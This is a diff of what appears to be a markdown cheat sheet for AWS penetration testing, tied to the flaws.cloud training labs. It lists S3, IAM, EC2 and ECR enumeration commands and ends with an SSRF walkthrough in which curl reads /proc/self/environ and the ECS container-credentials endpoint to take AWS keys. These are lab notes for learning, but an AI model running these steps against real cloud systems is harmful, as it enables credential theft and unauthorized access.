@@ -32,11 +32,9 @@ There are many ways to discover the names of Buckets. One of the easiest ways is
 - https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum#enumeration
 
 1 - Listing the Contents of Buckets:
-- ```aws s3 --profile YOUR_ACCOUNT ls s3://BUCKET-NAME```
+  - ```aws s3 --profile YOUR_ACCOUNT ls s3://BUCKET-NAME```
 
-2 - 
-
-#### S3 misconfig series:
+2 - S3 misconfig series:
 
 1. http://flaws.cloud/
 2. http://flaws.cloud/hint1.html
@@ -76,30 +74,30 @@ This command will add entries to the .aws/config and .aws/credentials files in y
 2 - A few other common AWS reconnaissance techniques are:
 
   - Finding the Account ID belonging to an access key:
-  - ```aws sts get-access-key-info --access-key-id AKIAEXAMPLE```
+    - ```aws sts get-access-key-info --access-key-id AKIAEXAMPLE```
 
   - Determining the Username the access key you're using belongs to
-  - ```aws sts get-caller-identity --profile PROFILENAME```
+    - ```aws sts get-caller-identity --profile PROFILENAME```
 
   - Listing all the EC2 instances running in an account
-  - ```aws ec2 describe-instances --output text --profile PROFILENAME```
+    - ```aws ec2 describe-instances --output text --profile PROFILENAME```
 
   - Listing all the EC2 instances running in an account in a different region
-  - ```aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME```
+    - ```aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME```
 
 3 - Enum Policies
 
 - https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-iam-enum
 
 - Get metadata of user
-- ```aws --profile PROFILE-NAME iam get-user```
+  - ```aws --profile PROFILE-NAME iam get-user```
 
 - Get policies of user
-- ```aws --profile PROFILE-NAME iam list-attached-user-policies --user-name CURRENT-OR-OTHER```
+  - ```aws --profile PROFILE-NAME iam list-attached-user-policies --user-name CURRENT-OR-OTHER```
 
 - Get policy content
-- ```aws --profile PROFILE-NAME iam get-policy --policy-arn <policy_arn>```
-- ```aws iam get-policy-version --policy-arn <arn:aws:iam::975426262029:policy/list_apigateways> --version-id <VERSION_X>```
+  - ```aws --profile PROFILE-NAME iam get-policy --policy-arn <policy_arn>```
+  - ```aws iam get-policy-version --policy-arn <arn:aws:iam::975426262029:policy/list_apigateways> --version-id <VERSION_X>```
 
 
 > ## EC2
@@ -109,13 +107,13 @@ This command will add entries to the .aws/config and .aws/credentials files in y
 - https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum
 
 - Discovery snapshots
-- ```aws --profile PROFILE-NAME ec2 describe-snapshots --owner-id ACCOUNT-ID```
+  - ```aws --profile PROFILE-NAME ec2 describe-snapshots --owner-id ACCOUNT-ID```
 
 - Snapshot Dump
-- https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump
-- http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint1.html
-- http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint2.html
-- http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint3.html
+  - https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump
+  - http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint1.html
+  - http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint2.html
+  - http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint3.html
 
 
 
@@ -124,32 +122,32 @@ This command will add entries to the .aws/config and .aws/credentials files in y
 #### Internal/Authenticated
 
 - Get repos
-- ```aws ecr describe-repositories --profile PROFILE-NAME```
-- ```aws ecr describe-registry --profile PROFILE-NAME```
+  - ```aws ecr describe-repositories --profile PROFILE-NAME```
+  - ```aws ecr describe-registry --profile PROFILE-NAME```
 
 
 - Get image metadata
-- ```aws ecr list-images --repository-name <repo_name> --profile PROFILE-NAME```
+  - ```aws ecr list-images --repository-name <repo_name> --profile PROFILE-NAME```
 
-- ```aws ecr list-images --repository-name <repo_name> --resgistry-id ACCOUNT-ID --profile PROFILE-NAME```
+  - ```aws ecr list-images --repository-name <repo_name> --resgistry-id ACCOUNT-ID --profile PROFILE-NAME```
 
-- ```aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest | jq '.images[].imageManifest | fromjson'```
+  - ```aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest | jq '.images[].imageManifest | fromjson'```
 
-- ```aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:..."```
+  - ```aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:..."```
 
 - Login, Pull & Push
-- login - ```aws ecr --profile PROFILE-NAME get-login-password --region REGION | docker login --username AWS --password-stdin ACCOUNT-ID.dkr.ecr.REGION.amazonaws.com```
-- pull image - ```docker pull <account_id>.dkr.ecr.<region>.amazonaws.com/<img_name>:latest```
+  - login - ```aws ecr --profile PROFILE-NAME get-login-password --region REGION | docker login --username AWS --password-stdin ACCOUNT-ID.dkr.ecr.REGION.amazonaws.com```
+  - pull image - ```docker pull <account_id>.dkr.ecr.<region>.amazonaws.com/<img_name>:latest```
 
 
 - Get image metadata
-- ```aws ecr describe-images --repository-name level2 --profile PROFILE-ID```
+  - ```aws ecr describe-images --repository-name level2 --profile PROFILE-ID```
 
 
 - SSRF in AWS ECS (Container Service)
-- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#ssrf-in-aws-ecs-container-service-credentials
-- https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html
-1. ```curl -v http://container.target.flaws2.cloud/proxy/file:///proc/self/environ -o environ```
-2. In "environ" output file found variable "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" copy paste in next curl cli:
-3. ```curl -v http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/cd0f067f-f28a-4f8a-ba76-0e697ec1d289```
-4. Get creds ...
+  - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#ssrf-in-aws-ecs-container-service-credentials
+  - https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html
+  1. ```curl -v http://container.target.flaws2.cloud/proxy/file:///proc/self/environ -o environ```
+  2. In "environ" output file found variable "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" copy paste in next curl cli:
+  3. ```curl -v http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/cd0f067f-f28a-4f8a-ba76-0e697ec1d289```
+  4. Get creds ...
